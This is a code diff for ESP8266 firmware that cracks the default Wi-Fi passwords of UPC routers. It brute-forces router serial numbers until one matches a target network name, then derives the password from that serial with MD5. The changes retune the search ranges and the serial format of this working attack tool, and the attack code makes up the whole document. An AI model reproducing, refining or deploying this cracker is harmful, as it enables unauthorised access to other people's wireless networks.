@@ -317,9 +317,8 @@ int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;
 #define MAGIC2 0x6b5fca6bll
 
 #define MAX0 9
-#define MAX1 99
-#define MAX2 9
-#define MAX3 9999
+#define MAX1 365
+#define MAX2 6800
 
 ICACHE_FLASH_ATTR
 void hash2pass(uint8_t *in_hash, char *out_pass)
@@ -357,12 +356,8 @@ __attribute((optimize("O3")))
 ICACHE_FLASH_ATTR
 uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 {
-	uint32_t a, b;
-
-	a = data[1] * 10 + data[2];
-	b = data[0] * 2500000 + a * 6800 + data[3] + magic;
-
-	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
+    uint64_t a = data[0] * 2500000 + data[1] * 6800 + data[2] + magic;
+    return a - (((a * MAGIC2) >> 54) - (a >> 31)) * 10000000;
 }
 
 __attribute((optimize("O3")))
@@ -370,7 +365,7 @@ ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
     size_t ap_to_crack = (size_t) events->par;
 
-    uint32_t buf[4];
+    uint32_t buf[3];
     char serial[64];
     char pass[9], tmpstr[17];
     uint8_t h1[16], h2[16];
@@ -394,15 +389,14 @@ static void crack(os_event_t *events){
         for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
             printf("Cracking ESSID UPC%07d... %u/%u\n", aps[ap_to_crack].target, buf[0], MAX0);
         for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
-        for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
-        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
+        for (buf[2] = 0; buf[2] <= MAX2; buf[2]++) {
             // feed the watchdog so it doesn't reset us
             system_soft_wdt_feed();
 
             if (upc_generate_ssid(buf, MAGIC_24GHZ) != aps[ap_to_crack].target)
                 continue;
 
-            os_sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
+            os_sprintf(serial, "SAAP%d%03d%d", buf[0], buf[1], buf[2]);
 
             MD5_Init(&ctx);
             MD5_Update(&ctx, serial, strlen(serial));
